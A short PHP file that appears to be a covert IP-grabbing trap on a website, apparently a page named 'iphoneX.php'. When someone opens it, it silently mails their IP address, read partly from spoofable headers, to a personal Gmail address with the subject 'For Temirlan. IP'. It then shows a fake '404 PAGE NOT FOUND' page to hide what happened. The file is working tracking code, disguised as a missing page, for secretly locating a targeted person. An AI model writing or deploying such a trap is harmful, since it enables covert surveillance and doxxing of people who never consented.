<?php
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = $_SERVER['REMOTE_ADDR'];
$is = '';
if(filter_var($client, FILTER_VALIDATE_IP))
{
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
    $ip = $forward;
}
else
{
    $ip = $remote;
}
$to = "zhambyl.9670@gmail.com";
$subject = "For Temirlan. IP";
$txt = $ip;
$headers = "From: altyn-bilim.kz/iphoneX.php";
mail($to,$subject,$txt,$headers);
?>
<!DOCTYPE html>
<html>
<head>
	<title>PAGE NOT FOUND</title>
</head>
<body>
<center><h1>404. PAGE NOT FOUND</h1></center>
</body>
</html>